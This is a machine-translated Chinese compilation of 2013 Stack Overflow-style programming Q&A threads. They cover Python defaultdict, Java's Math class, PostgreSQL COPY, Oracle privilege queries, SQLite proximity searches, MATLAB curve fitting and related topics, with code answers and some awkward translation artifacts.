你可以使用一个[`defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict).

```
from collections import defaultdict
swapped = defaultdict(set)
for k, v in source.iteritems():
    swapped[v].add(k) 
```

`defaultdict`使用作为工厂初始化参数提供的可调用对象，透明地在任何尚未访问的键上创建一个值。以上基本等价于：

```
swapped = {}
for k, v in source.iteritems():
    if v not in swapped:
        swapped[v] = set()
    swapped[v].add(k) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:23:24.563

```
import collections
def bind(dict1):
    dict2 = collections.defaultdict(set)
    for k, v in dict1.items():
        dict2[v].add(k)
    return dict2

result = bind({'Europa': 'Jupiter', 'Psamathe': 'Neptune', 'Cordelia': 'Uranus', 'Cupid': 'Uranus'})
print(result) 
```

产量

> defaultdict(, {'Jupiter': set(['Europa']), 'Neptune': set(['Psamathe']), '天王星': set(['Cordelia', 'Cupid'])})

* * *

或者，您可以让`dict2`a`dict`代替 a `collections.defaultdict(set)`，并使用以下`setdefault`方法：

```
def bind(dict1):
    dict2 = {}
    for k, v in dict1.items():
        dict2.setdefault(v,set()).add(k)
    return dict2 
```

* * *

参考：

*   [设置.add](http://docs.python.org/2/library/stdtypes.html#set.add)
*   [集合.defaultdict](http://docs.python.org/2/library/collections.html#collections.defaultdict)
*   [dict.setdefault](http://docs.python.org/2/library/stdtypes.html#dict.setdefault)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T17:23:37.740

```
>>> import collections
>>> out = collections.defaultdict(set)
>>> inval = {'Europa': 'Jupiter', 'Psamathe': 'Neptune', 'Cordelia': 'Uranus', 'Cupid': 'Uranus'}
>>> for k, v in inval.items():
...     out[v].add(k)
...
>>> out
defaultdict(<type 'set'>, {'Jupiter': set(['Europa']), 'Neptune': set(['Psamathe']), 'Uranus': set(['Cordelia', 'Cupid'])}) 
```

# internet-explorer-10 - IE 10 无法正确呈现日语

> ID：16110157
> 
> 赞同：0
> 
> 时间：2013-04-19T17:19:57.380
> 
> 标签：internet-explorer-10

我最近发现了 IE10 的一个问题。我们有一个网页，在日语翻译旁边显示英文文本。一些日文字符显示为正方形。在查看源页面中，所有字符都正确呈现。数据库还正确呈现了字符。不寻常的部分是，当我用光标阻止字符时，它们会转换为正确的字符。

IE10 我相信有一个错误。

任何人有类似的问题或知道修复？检查所有语言设置、区域设置、浏览器字体设置和许多其他测试。没有什么能纠正这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-07T15:12:28.463

此问题与某些字体和 Windows 应用程序将支持的双字节字符有关。

一些较旧的字体可能使用两个十六进制字符表示来表示单个字符。有些字体支持这一点，有些则不支持。

在这种情况下，有争议的人物如下......

ジ

シ和゙</p>

后两个我认为是特殊字符，它们组合起来是为了表示ジ。

Unicode ISO 网站表中的 Unicode 标准对它们进行了如下定义……

十进制字符 HEX 名称

12472ジ30B8片假名字母ZI

12471 シ 30B7 片假名字母 SI

12441っ゙ 3099 COMBINING KATAKANA-HIRAGANA VOICED SOUND SOUND MARK（结合小涂（っ））

所以有些字体使用 12471 + 12441 来制作 12472。这是我发现的。但实际字符串有 12471 + 12441 而不是 12472 或十六进制：0x30B7、0x3099 而不是 0x30B8。

只要使用的字体不支持此绑定，就会显示一个框。挑战在于，它可能就像某人使用不兼容的 UTF8 字体创建生日贺卡一样简单，这可能导致 PC 无法正确显示字符。

# windows - 如何从 cygwin ssh 运行 win32 gui 程序？

> ID：16110164
> 
> 赞同：2
> 
> 时间：2013-04-19T17:20:15.667
> 
> 标签：windows, cygwin, nsis

我有一个（nsis）安装程序，我在静默模式下运行。我想通过 ssh 运行它，以便我可以针对已安装的代码库自动运行我们的测试套件。不幸的是，当我运行程序时，它只是启动并坐在那里，实际上并没有做任何事情。

我的猜测是，这在某种程度上是由于 Windows 服务（在这种情况下是 ssh）无法与桌面交互。因此，即使安装程序保持沉默，它也会分配一些对象或其他东西并永远阻塞。

如何强制安装程序运行？请注意，它*是*无声的，不应要求任何用户输入。有没有办法我可以说“在桌面上运行”之类的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:03:16.273

尝试使用Sysinternals 的[PsExec](http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx)。如果您要通过 ssh 在远程计算机上执行它，请确保从桌面运行一次，以便您接受许可条款。

类似的东西`PsExec.exe -i -s "full path to program" args`应该可以工作。`-i`在桌面上以交互模式运行程序，并`-s`在“系统”用户下运行它，这样您就不必输入用户凭据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-17T16:59:25.150

我在尝试在我的 64 位 win 7 机器上启动交互式程序时遇到了类似的问题。

打算远程启动程序的机器：Win 8、Ubuntu

机器运行 cygwin sshd：win 7

Cygwin sshd 由“cyg_server”拥有，而不是本地用户，因此我无法选中“允许服务与桌面交互”框（尽管我听说该复选框无论如何都不起作用）。

我以一种非常丑陋的方式解决了这个问题。我使用了 tmux，它现在可以在 cygwin 上使用。在 win7 机器上，我在启动时启动了一个名为“launcher”的 tmux 会话。

后来，当我从另一个盒子 ssh 进入时，我将命令发送到 tmux 会话。tmux 会话是本地用户，因此它将以交互方式启动程序。

# java - 试图实例化数学类

> ID：16110169
> 
> 赞同：1
> 
> 时间：2013-04-19T17:20:41.383
> 
> 标签：java

谁能告诉我我在这里做错了什么？

```
private static java.lang.Math a = new java.lang.Math(); 
```

这导致了一个错误，但我不知道为什么。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-19T17:21:43.847

您不能实例化 Math 实例。都是静态方法。没有公共的默认构造函数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T17:24:42.020

*谁能告诉我我在这里做错了什么？*

答案是您试图`private`从类外部使用单个构造函数实例化一个类。

```
/**
 * Don't let anyone instantiate this class.
 */
private Math() {} 
```

*a.abs(int min - int max); ！！*

您可以执行以下方式：

```
int min = xxx;
int max = yyy;
int abs = Math.abs(min-max); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T17:22:50.200

您正在尝试实例化 java.lang.Math ... 我不知道为什么。

像这样使用它：

```
java.lang.Math.sin(x); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-19T17:24:02.737

为什么要创建新对象，它的最终类和所有方法都是静态的。

我试图说如果所有方法都是静态的，为什么要创建一个对象，因为它是最终的，构造函数调用可能会失败

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-19T20:32:36.053

你可以实例化 Math，但你不应该，除非它是出于某种模糊的原因。

```
public static void main(String[] args) throws Exception {
    Constructor<?> constructor = Math.class.getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    Math math = (Math) constructor.newInstance();
    ...
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-19T17:47:35.857

如果您无权访问其构造函数，则不能（[没有反射）创建类的对象，例如在这种情况下，构造函数是私有的。](https://stackoverflow.com/questions/5629706/java-accessing-private-constructor-with-type-parameters)

> 我已经有一个数学课，所以这就是我尝试其他选择的原因

的所有重要方法`java.lang.Math`都是静态的，因此您不需要该类的实例来调用它们。只需`Math.abs(x - y)`在您的情况下使用 or`java.lang.Math.abs(x - y)`来指定您要使用`java.lang.Math`的，而不是您的班级。

* * *

如果您只想使用一些方法，`java.lang.Math`您可以像这样导入它们

```
import static java.lang.Math.abs; 
```

并像使用它一样

```
abs(10 - 20) 
```

* * *

你也可以试试这个方法

```
java.lang.Math a = null;
a.abs(x - y);   // compilator will change it to 
                //java.lang.Math.abs(x - y) since abs is static method 
```

但我会留下来，`java.lang.Math.abs(x - y)`因为它更具可读性。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-04-19T17:49:33.263

您不能创建 Math 类的对象，因为 Math 类的构造函数具有 private 修饰符。

此外，类中的所有方法都是静态的。所以你可以直接使用它们（例如： Math.method() ）。通过扩展，类中仅存在静态方法并不需要对象构造。

因此，不能实例化 Math，因为*它的设计使得任何人都不会发现需要实例化它*。

# postgresql - postgresql 如何让 COPY 自动解释格式化的数字字段？

> ID：16110175
> 
> 赞同：2
> 
> 时间：2013-04-19T17:21:05.643
> 
> 标签：postgresql, sqlbulkcopy

我有一个输入 CSV 文件，其中包含以下内容：

```
SD-32MM-1001,"100.00",4/11/2012
SD-32MM-1001,"1,000.00",4/12/2012 
```

我试图 COPY 将其导入 postgresql 表（varchar，float8，date）并遇到错误：

```
# copy foo from '/tmp/foo.csv' with header csv;
ERROR:  invalid input syntax for type double precision: "1,000.00"
Time: 1.251 ms 
```

除了预处理输入文件之外，PG 中是否有一些设置可以让它读取像上面这样的文件并在 COPY 中转换为数字形式？COPY 以外的东西？

如果需要预处理，是否可以将其设置为 COPY 命令的一部分？（不是`psql \copy`）？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:35:42.927

预处理的选项是首先作为文本复制到临时表中。从那里使用 to_number 函数插入最终表：

```
select to_number('1,000.00', 'FM000,009.99')::double precision; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:57:08.840

这是一个奇怪的 CSV 文件，它用双引号将数值括起来，但保留未加`SD-32MM-1001`引号的值。事实上，我不确定我*是否*见过这样的 CSV 文件。

如果我站在你的立场上，我会尝试`copy`使用这种格式的文件。

```
"SD-32MM-1001",100.00,4/11/2012
"SD-32MM-1001",1000.00,4/12/2012 
```

请注意，数字没有逗号。我能够成功导入该文件

```
copy test from '/fullpath/test.dat' with csv 
```

我认为你最好的选择是从你的源代码中获得更好的格式化输出。

# php - 无法打开流：HTTP 请求失败！HTTP/1.0 400 错误请求

> ID：16110176
> 
> 赞同：1
> 
> 时间：2013-04-19T17:21:06.517
> 
> 标签：php, mysql, facebook, apache, ubuntu

我的服务器似乎在哪里出现问题。我收到了这个错误。

```
 failed to open stream: HTTP request failed! HTTP/1.0 400 Bad Request 
```

这是我已经实施了一年多的代码，并且已确认在单独的登台服务器上工作。

```
 $url = 'http://graph.facebook.com/10150624051911279/photos/all';

$response = json_decode(file_get_contents($url, true));

foreach ($response->data as $photo) {
    echo '<li><a href="' . $photo->link . '" ><img class="img" src="timthumb.php?src=' . $photo->source . '&h=175&w=175"  /></a></li>';
} 
```

我的服务器上可能出现的问题可能会导致此问题。我难住了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T17:35:03.480

请求应该失败，因为要访问该 URL，您需要获取访问令牌。所以 Facebook 回来了

```
{
   "error": {
      "message": "An access token is required to request this resource.",
      "type": "OAuthException",
      "code": 104
   }
} 
```

以及“400 Bad Request”状态。此外，由于您正在打开一个 URL，因此 file_get_contents 的第二个参数应该为 false（如果您知道包含路径不存在，则没有必要搜索包含路径）。

要仍然从 Facebook 获得响应并忽略错误，您可以执行以下操作：

```
$url = 'http://graph.facebook.com/10150624051911279/photos/all';
$context = stream_context_create(array(
  'http' => array(
     'ignore_errors'=>true,
     'method'=>'GET'
     // for more options check http://www.php.net/manual/en/context.http.php
   )
));
$response = json_decode(file_get_contents($url, false, $context)); 
```

# matlab - 如何在matlab中将曲线拟合到阻尼正弦波

> ID：16110185
> 
> 赞同：0
> 
> 时间：2013-04-19T17:21:29.110
> 
> 标签：matlab, curve-fitting

我已经完成了一些测量，它应该是一个阻尼正弦波，但我找不到任何关于如何使用 Matlab 的曲线拟合工具制作（如果可能的话）良好阻尼正弦波的信息。

这是我使用“平滑样条曲线”得到的结果：

[图片 http://s21.postimg.org/yznumla1h/damped.png](http://s21.postimg.org/yznumla1h/damped.png)。

**编辑 1**：这是我使用“自定义方程”选项得到的结果：

![在此处输入图像描述](https://i.stack.imgur.com/hgpoJ.jpg)

**编辑 2**：我已将数据以 csv 格式上传到[pastebin](http://pastebin.com/LWb6akBe)，其中第一列是幅度，第二列是时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:34:58.557

可以使用以下代码创建阻尼 sin 函数：

```
f=f*2*pi;
t=0:.001:1;
y=A*sin(f*t + phi).*exp(-a*t);

plot(t,y);
axis([0 1 -2.2 2.2]); 
```

现在您可以使用 matlab 中的“cftool”并加载您的数据，然后将方程类型设置为自定义并输入阻尼 sin 函数的公式。在这里你可以看到我到目前为止发现的......

![在此处输入图像描述](https://i.stack.imgur.com/xbhAL.png)

我认为数据的分布使得拟合工具很难很好地拟合。它可能需要更多数据或更多分布式数据。此外，还有其他工具和方法，例如现在检查一下：docstoc.com/docs/74524947/Mathcad-Damped-sine-fit-mcd

对于所有这些实际尝试搜索和找到局部最优值的方法（对于每个拟合参数），最重要的是初始条件。我相信如果你选择了一个好的初始条件（初始猜测），拟合工具就会很好地工作。

祝你好运

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T01:49:04.727

我不会为此使用曲线拟合工具箱，我会使用曲线拟合函数，例如`lsqcurvefit`. 这是我不久前做的一个例子：

```
% Define curve model functions
expsin = @(a, f, phi, tau, t)a * sin(omega * t + phi) .* exp(-tau * t);
lsqexpsin = @(p, t)expsin(p(1), p(2), p(3), p(4), t);

% Setup data params
a = 1;          % gain
f = 10;         % frequency
phi = pi/2;     % phase angle
tau = 0.9252523;% time constant

fs = 100;   % sample rate
N = fs;     % length
SNR = 10;   % signal to noise ratio

% Generate time vector
dt = 1/fs; 
t = (0:N-1)*dt; 

omega = 2 * pi * f; % angular freq
noiseGain = 10^(-SNR/20); % gain for given SNR

% Generate dummy data: decaying sinusoid plus noise
x = expsin(a, omega, phi, tau, t);
noise = noiseGain * rand(size(x));
noise = noise - mean(noise);
x = x + noise;

close all; figure; hold on;
plot(t, x, 'k-', 'LineWidth', 2);

% Count zero crossings to find frequency
zCross = find(x(1:end-1) .* x(2:end) < 0);
T = mean(diff(zCross) * dt) * 2;
fEstimate = 1 / T;
omegaEstimate = 2 * pi * fEstimate;

% Fit model to data
init = [0.5, omegaEstimate, 0, 0.5];
[newparams, err] = lsqcurvefit(lsqexpsin, init, t, x);

plot(t, lsqexpsin(newparams, t)) 
```

这里生成了一些参数已知的数据，并添加了一些随机噪声；绘制数据。这些参数`[a, phi, tau]`是根据数据和一条曲线估计的，估计的参数绘制在顶部。

# c# - C# - 通过引用传递值类型的良好而灵活的方法？

> ID：16110187
> 
> 赞同：2
> 
> 时间：2013-04-19T17:21:33.930
> 
> 标签：c#, variables, reference

我的问题，缩小为一个简单的解释，如下所示：我有一个类需要处理一个可能会发生变化的数字（不改变它）。这个数字不一定来自另一个班级，它可以是任何东西。但是我只想将它“给”一次类，而不是不断地调用更新方法或必须创建一个包装器（再次，正如我所说，这应该适用于任何类型的数字并且必须包装一切都是不切实际的）。

这是一些代码，希望对您有所帮助：

```
public class SimpleExample
{
    int value;
    public SimpleExample(int variableOfWhichINeedAReference)
    {
        //Of course this won't work, but I'll keep it simple.
        value = variableOfWhichINeedAReference; 
    }
    public void DisplayValue()
    {
        print(value);
    }
}
public class RandomClass
{
    int myValue = 10;
    SimpleExample s = new SimpleExample(myValue);

    public void WorkWithValue()
    {
        myValue++;
    }

    public void Display()
    {
        print(foo);
        print(bar);
        s.DisplayValue();
    }

} 
```

现在，问题似乎很明显：如果我实例化一个 SimpleExample 并给它一个变量作为参数，它将获得它的值而不是对它的引用。有没有一种足够简单的方法可以避免我创建包装器？谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:30:42.717

制作一个非常简单的类：

```
class Ref<T>
{
    public T Value;
    public Ref<T>()
    {
    }
    public Ref<T>(T value)
    {
        this.Value = value;
    }
} 
```

然后像这样使用它：

```
class A
{
    Ref<int> x;
    public A(Ref<int> x)
    {
        this.x = x;
    }
    public void Increment()
    {
        x.Value++;
    }
}

...

Ref<int> x = new Ref<int>(7);
A a = new A(x);
a.Increment();
Debug.Assert(x.Value == 8); 
```

请注意，`Ref<T>`这里的类是对*值*的引用，而不是对*变量*的引用。如果您想要引用变量，请使用[Eric Lippert 的解决方案](https://stackoverflow.com/questions/2980463/how-do-i-assign-by-reference-to-a-class-field-in-c/2982037#2982037)（如 Filip 所指出的）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T17:32:00.740

So what you want is not an int, but rather a way of getting an int at some point in time. There are several ways of doing this, one of which is to have your object accept a `Func<int>`. Then the code can pass in a method that returns the current value of...whatever, rather than the value at the time `SimpleExample` is created. Using a lambda to close over a variable makes doing this much easier as well.

```
public class SimpleExample
{
    Func<int> func;
    public SimpleExample(Func<int> func)
    {
        this.func = func;
    }
    public void DisplayValue()
    {
        print(func());
    }
}
public class RandomClass
{
    int myValue = 10;
    SimpleExample s;

    public RandomClass()
    {
        s = new SimpleExample(() => myValue);
    }

    public void WorkWithValue()
    {
        myValue++;
    }

    public void Display()
    {
        print(foo);
        print(bar);
        s.DisplayValue();
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:49:23.157

There is no standard wrapper for the purpose you seek, though a single-element array could be used for that purpose. Alternatively, one could define a simple wrapper type:

```
public class ExposedValueHolder<T> { public T Value; } // Really simple class, eh? 
```

and then use an `ExposedValueHolder<YourStructType>` to wrap your object. It's not possible in general to capture something passed as an arbitrary `ref` parameter, since objects may live indefinitely but byrefs (the things which are actually passed when using `ref` parameters) may die any time after function they're passed to goes out of scope.

# dart - Dart lang：您如何对文件上传和文件读取 API 进行浏览器功能测试？

> ID：16110188
> 
> 赞同：1
> 
> 时间：2013-04-19T17:21:40.073
> 
> 标签：dart, dart-webui

你如何使用 Dart 对浏览器支持进行功能测试？在 Javascript 中测试的常见事物。不幸的是，它仍然是必要的邪恶。

例如，如果浏览器支持“XMLHttpRequestUpload”，您如何编写测试，以便您可以回退到支持的功能？

此外，您如何测试“FileReader”、“Worker”、“ArrayBuffer”、“DataView”、“Uint8Array”、“Float32Array”……？

在 Javascript 中，您可以测试对象是否在全局命名空间（Window 等）中可用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T02:42:21.430

要检查您是否可以访问文件系统，请使用[FileSystem.supported](http://api.dartlang.org/docs/releases/latest/dart_html/FileSystem.html#supported)字段。同样，对于工人，请参阅[Worker.supported](http://api.dartlang.org/docs/releases/latest/dart_html/Worker.html#supported)。

由于 Dart 针对 IE9+，我认为您列出的其他 API 已经支持跨浏览器。

# android - 从 SQLite 数据库中获取某个点附近的所有项目

> ID：16110189
> 
> 赞同：3
> 
> 时间：2013-04-19T17:21:40.383
> 
> 标签：android, sqlite

我有一个充满地图 Locations 的数据库`(Latitude, Longitude)`，有没有办法可以执行 SQL 查询来返回某个位置周围的所有点？

现在我基本上抓取数据库中的所有内容并循环遍历每一个并使用检查距离

```
Location.distanceBetween(startPoint.latitude, startPoint.longitude,endPoint.latitude,endPoint.longitude, results); 
```

并保留在设定距离内但可能有很多点需要循环的项目。

那么有没有办法在 SQL 语句中做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:28:46.770

> 我有一个充满地图位置（纬度、经度）的数据库，有没有办法可以执行 SQL 查询来返回某个位置周围的所有点？

您可以轻松检查正方形区域。

使用*非常*简化的纬度/经度坐标表示您在 [25.86, 57.03] 并且您想要“邻居”（+/- .05）中的所有内容，您可以使用如下查询：

```
SELECT * FROM Coords WHERE (latitude BETWEEN 25.81 AND 25.91) AND (longitude BETWEEN 56.98 AND 57.08); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:35:24.030

您可以使用 WHERE 子句表达式过滤与原点 (x0, y0) 的角距离 r。由于 SQLite 没有平方根函数，因此您必须使用平方距离：

```
SELECT ... FROM ...
    WHERE (Latitude-x0)*(Latitude-x0) + (Longitude-y0)*(Longitude-y0) < r*r; 
```

唯一不能正常工作的地方是靠近两极或本初子午线。它也是球体的平面近似，因此它仅适用于`r`非常小的值。最后，它平等地缩放纬度和经度，因此所选区域看起来越来越椭圆，原点离赤道越远。

您必须将线性距离（例如，“30 米内”）转换为纬度/经度差异。这是一个相当复杂的主题，因为地球不是一个完美的球体。但是，对于粗略的计算，您可以使用 1 海里 = 1852 米 = 赤道经度的 1 角分的近似值。由于随着纬度远离赤道，经线越来越靠近，因此您需要使用一些三角函数来确定`r`在给定纬度使用的值。有关此问题的更多信息，请参阅[此线程](https://stackoverflow.com/questions/639695/how-to-convert-latitude-or-longitude-to-meters)或[此](https://stackoverflow.com/questions/8586635/convert-meters-to-latitude-longitude-from-any-point)线程，或在网上搜索*“将米转换为纬度经度”*。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-19T17:38:22.300

您还可以使用[SQLite R*Tree](http://www.sqlite.org/rtree.html)扩展。

R-Tree 是一种特殊的索引，专为进行范围查询而设计。R-Trees 最常用于地理空间系统，其中每个条目都是一个具有最小和最大 X 和 Y 坐标的矩形。

SQLite R*Tree 模块的源代码包含在 SQLite3 合并中，但默认情况下是禁用的。要启用 R*Tree 模块，只需使用定义的 SQLITE_ENABLE_RTREE C 预处理器宏进行编译。

# jquery - ajax 调用后数据显示在 console.log 中，但未出现在 fancybox 的自定义 div 中

> ID：16110193
> 
> 赞同：0
> 
> 时间：2013-04-19T17:21:52.370
> 
> 标签：jquery, jquery-plugins, fancybox-2

我附加了一个带有花式框的自定义 div 以显示有关当前元素的一些信息。所有数据都很好。控制台日志完全显示了我想要的内容，但不知何故，ajax 调用的结果在第一次时仅在 div 中显示一次。尽管我在 chrome 的开发控制台中得到了正确的转储，但随后的 ajax 调用不会在 div 上呈现任何内容。

我哪里错了？

```
$(".public-gallery").fancybox({
    nextMethod : 'resizeIn',
    nextSpeed  : 250,
    padding : 10,
    beforeLoad: function() {
        this.title = $(this.element).attr('caption');
    },
    afterLoad: function(current){

        var description = "<div class='links'><div class='inner' id='resinfo'></div></div>";
        $('.fancybox-overlay').append(description);
        var ref = current.element.data('ref');  
        console.info("ref : " + ref);
         $.post("ajax/fetchresourceinfo.php", {'ref':ref}, function(data){
            $('#resinfo').text("ref:"+ref + data);
            console.info("from here"+data); 
        });
    }}); 
```

# oracle - Oracle：检查读/写权限，自动化测试

> ID：16110197
> 
> 赞同：2
> 
> 时间：2013-04-19T17:22:02.603
> 
> 标签：oracle, oracle10g, oracle11g

我有一个关于 Oracle 和检查权限的问题。

## 一些背景信息

我写了一些 php 脚本来“测试”我们环境中的各种东西。其中一项任务是检查用户是否具有对过程的执行权限以及该过程是否有效/已编译。

这是查询

```
select ao.object_name, utp.grantee, ao.status, utp.privilege
from all_objects ao, user_tab_privs utp 
where utp.owner = ao.owner and
ao.object_name = utp.table_name and
upper( ao.object_name ) = :object_name and 
ao.object_type = 'PACKAGE' and
utp.privilege = 'EXECUTE' and
ao.status = 'VALID' 
```

这运作良好，并为我们节省了程序特权的时间；我现在确实意识到我也可以仔细检查 all_tab_privs 以检查执行访问。

## 问题

现在我的问题是，我如何对表格做类似的事情？我们遇到了一个问题，即某个用户在表上有 SELECT privs 但没有 UPDATE/INSERT privs。如何单独检查这些权限。我查看了 all_tab_privs 但没有发现它向我展示了我想要的东西。它有我可以执行的程序，但是当我检查是否存在已知表时，它不存在。例如，我将运行以下

```
select * from all_tab_privs 
where table_name = 'KNOWN_TABLE' and 
grantee = 'CURRENT_USER'
and privilege in ( 'SELECT', 'UPDATE', 'INSERT' ); 
```

但是我没有为一个表取回 3 行，我知道 100% 我已经可以选择/插入/更新它什么都不返回。

有任何想法吗？谢谢你。

### 免责声明

我知道我可以尝试插入/更新数据然后删除它，但我不想这样做。我宁愿不留下任何痕迹，因为这些脚本会定期运行，应该是可重复的，并且不应该改变任何数据的状态，即使它只是桌子上的一个序列。

此外，如果您可以提供可能的查询的“列表”，我可以使用这些查询来确定可以使用的权限。例如，要确定我是否具有选择访问权限，请运行查询 1、2 和 3。如果其中任何一个返回数据，则您可以选择 privs 等以进行插入/更新。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-05-28T16:39:00.627

这对我来说看起来相当乐观，因为角色问题可能会变得非常复杂，特别是如果角色得到密码保护，而且如果没有实际尝试 DML，我永远不会 100% 真正信任该方法。

尝试以下查询可能更简单：

```
select count(*)
from   schema_name.table_name
where  1=0;

insert into schema_name.table_name
select *
from   schema_name.table_name
where  1=0;

delete from schema_name.table_name
where  1=0;

update schema_name.table_name
set    column_name = column_name
where  1=0; 
```

我相信如果没有授予特权（没有方便的数据库来检查它），此类查询将失败，并且它们永远不会修改任何数据。

顺便说一句，ANY 权限通常被认为是一个安全问题，因此如果授予任何用户权限，您可能希望系统失败。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-22T16:15:47.880

如果您具有通过角色授予的权限，则需要进行更复杂的检查。评论中的链接提供了一些查询以查看更广泛的图片，但如果您想检查当前用户可以看到的内容 - 正如您的一个查询所建议的那样 - 那么您可以查询[`session_roles`](http://docs.oracle.com/cd/E11882_01/server.112/e25513/statviews_5168.htm)视图以查看当前可用的对象权限除了直接授予的对象权限外，还可以通过角色访问您的会话：

```
select atp.table_schema, atp.table_name, atp.privilege, atp.grantee,
    'Direct' as grant_type
from all_tab_privs atp
where atp.grantee = user
union all
select atp.table_schema, atp.table_name, atp.privilege, atp.grantee,
    'Via role' as grant_type
from session_roles sr
join all_tab_privs atp on atp.grantee = sr.role; 
```

如果您想查看特定对象或特权，您显然可以添加过滤器，`grant_type`伪列仅用于信息 - 并不是那么有用，因为您可以比较`grantee`以`user`获得我想的相同信息。

您可能还想查看[`session_privs`](http://docs.oracle.com/cd/E11882_01/server.112/e25513/statviews_5167.htm)，以检查您的用户是否具有您期望的任何系统权限。

但是，如果您希望单个查询同时检查另一个用户或多个用户的权限，您将需要更像链接查询的东西，以及运行它们所需的权限。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-28T15:47:13.587

我最终使用基于不同查询及其返回结果的多步骤方法解决了这个问题。我正在使用一些 PHP 代码执行所有查询，所以我没有 100% 的必要只有大查询来解决所有问题。

此外，我们的数据库在物理上是分开的，它们通过数据库链接链接在一起，所以我必须做一些额外的工作来确保这种权限检查跨数据库链接工作。

目前我只检查 SELECT、DELETE、UPDATE 和 INSERT 权限；这就是我现在真正需要的。

## 步骤

这是坚果列表中的一般程序。

1.  获取用户可用的所有数据库链接的列表。
2.  对于以下步骤，从我们登录的当前数据库开始，然后检查从步骤 1 检索到的每个数据库链接。

    2a。使用数据库查询检查表是否可见。

    2b。如果该表可见，请检查是否有任何权限查询返回此用户有权访问该表。

## 查询

以下是上述每个步骤的查询。

### 1 数据库链接

```
select db_link from all_db_links 
```

### 2a 表格可见性

```
select * from all_tables%DB_LINK% where table_name = :table_name and owner = :owner 
```

在适用的情况下，上面的 %DB_LINK% 将替换为 @db_link。如果我们正在检查当前连接，那么我将其完全删除。请记住，查询是由 PHP 脚本执行的，因此我可以对字符串进行一些字符串操作，以删除当前数据库的 %DB_LINK% 或将其替换为我们从步骤 1 中获得的数据库链接之一。

### 2b。用户、角色、表

这里总共有 4 个查询。

```
/*****/
/* 1 */
/*****/
select * 
from user_tab_privs%DB_LINK%
where 
owner = :owner
and
table_name = :table_name
and
privilege = :privilege

/*****/
/* 2 */
/*****/

select * from user_sys_privs%DB_LINK% where privilege = :privilege

/*****/
/* 3 */
/*****/

select * from
      (
        select distinct granted_role from 
        (
          select null linker, granted_role 
          from user_role_privs%DB_LINK%
          union all
          select role linker, granted_role 
          from role_role_privs%DB_LINK%
        )
        start with linker is null
        connect by prior granted_role = linker 
      ) user_roles join role_tab_privs%DB_LINK% rtab on user_roles.granted_role = rtab.role
      where 
      owner = :owner
      and
      table_name = :table_name
      and
      rtab.privilege = :privilege

/*****/
/* 4 */
/*****/

select * from
  (
    select distinct granted_role from 
    (
      select null linker, granted_role 
      from user_role_privs%DB_LINK%
      union all
      select role linker, granted_role 
      from role_role_privs%DB_LINK%
    )
    start with linker is null
    connect by prior granted_role = linker 
  ) user_roles join role_sys_privs%DB_LINK% rtab on user_roles.granted_role = rtab.role
  where rtab.privilege = :privilege 
```

## 解释

### 数据库链接

在 phpunit 测试中，我传递了两件事：表名和模式名（所有者）。但是，由于存在数据库链接，我们必须在查询中使用 @db_link 显式检查其他数据库。否则，我可能会报告一个表无法访问，而实际上它可以通过数据库链接访问。

### 表可见性

如果用户看不到表，那么检查权限是没有意义的。检查权限还可以防止用户被赋予“SELECT ANY TABLE”权限但表本身实际上并不存在的情况导致不必要的失败。

### 4 个查询的带

如其他海报所示，用户可以通过多种方式访问​​表格。具体来说，他们可以被赋予角色，这些角色可以被赋予角色，然后这些角色可以被分配访问权。或者，用户可以通过系统权限获得显式访问或通用访问。

查询 1

四个查询中的第一个检查是否已为用户提供了对表的显式 SELECT、DELETE 等权限。这很容易理解，理想情况下就是所有必要的

查询 2

第二个检查是否已授予用户任何系统权限，如 DELETE ANY TABLE、SELECT ANY TABLE、INSERT ANY TABLE 等。这些权限并未在表上显式授予，但用户可以在任何表上执行任何引用的操作他们有知名度。

查询 3

第三个查询将查看用户拥有的任何角色，无论是直接还是间接，是否已被授予对表的显式 SELECT、DELETE 等权限。这类似于查询 1，只是它基于赋予用户的角色，而不是用户。

查询 4

第四个检查用户拥有的任何角色，无论是直接还是间接，是否已被授予任何系统权限，例如 DELETE ANY TABLE、SELECT ANY TABLE、INSERT ANY TABLE 等。这类似于查询 2。

就是这样！我将这些链接在一起，并使用从每个返回的结果来确定用户是否具有所需的权限。

## 值得一提的细节

如果用户拥有跨 db_link_1 的任何权限，这并不意味着他们对跨 db_link_2 访问的表拥有相同的权限。大多数人应该知道这一点，但我想确保我明确地说明了这一点。例如，通过 db_link_1 在表 1 上选择权限并不意味着通过 db_link_2 在表 2 上选择权限。

我一次检查每个 db_link。所以首先我从我直接连接的数据库开始，不需要数据库链接。然后，如果我找不到表或表上没有权限，我会转到下一个数据库链接。

